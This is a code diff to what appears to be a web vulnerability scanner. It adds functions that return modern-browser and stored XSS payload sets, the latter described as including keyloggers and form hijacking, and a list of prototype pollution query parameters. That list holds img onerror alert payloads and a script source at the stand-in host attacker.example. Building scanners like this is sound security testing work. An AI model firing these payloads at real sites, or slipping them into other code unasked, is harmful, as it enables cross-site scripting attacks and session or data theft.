@@ -78,6 +78,8 @@ from ._payloads.advanced import (
   CLASSIC_LEGACY,
   ENCODING,
   CONTENT_TYPE,
+  MODERN_BROWSER,
+  STORED_XSS,
 )
 
 # ---------------------------------------------------------------------------
@@ -274,6 +276,38 @@ def extra_no_interaction_payloads(marker: Optional[str] = None) -> List[str]:
   if marker is None:
     marker = make_confirm_marker()
   return [p.format(marker=marker) for p in EXTRA_NO_INTERACTION]
+
+
+def modern_browser_payloads(marker: Optional[str] = None) -> List[str]:
+  """Return modern browser API abuse payloads (Import Maps, Shadow DOM, Trusted Types, etc.)."""
+  if marker is None:
+    marker = make_confirm_marker()
+  return [p.format(marker=marker) for p in MODERN_BROWSER]
+
+
+def stored_xss_payloads(marker: Optional[str] = None) -> List[str]:
+  """Return stored XSS payloads: keylogger, form hijack, WebSocket, localStorage, etc."""
+  if marker is None:
+    marker = make_confirm_marker()
+  return [p.format(marker=marker) for p in STORED_XSS]
+
+
+def prototype_pollution_params(marker: Optional[str] = None) -> List[tuple[str, str]]:
+  """
+  Return (param_name, value) pairs for active prototype pollution testing.
+  These inject via query string like ?__proto__[key]=value.
+  """
+  if marker is None:
+    marker = make_confirm_marker()
+  return [
+    ("__proto__[html]",          f"<img src=x onerror=alert('{marker}')>"),
+    ("__proto__[src]",           f"//attacker.example/{marker}.js"),
+    ("__proto__[innerText]",     f"<img src=x onerror=alert('{marker}')>"),
+    ("__proto__[sourceURL]",     f"\nalert('{marker}')"),
+    ("__proto__[ALLOWED_TAGS][]","script"),
+    ("constructor[prototype][html]", f"<img src=x onerror=alert('{marker}')>"),
+    ("__proto__[template]",      f"<img src=x onerror=alert('{marker}')>"),
+  ]
 
 
 # ---------------------------------------------------------------------------
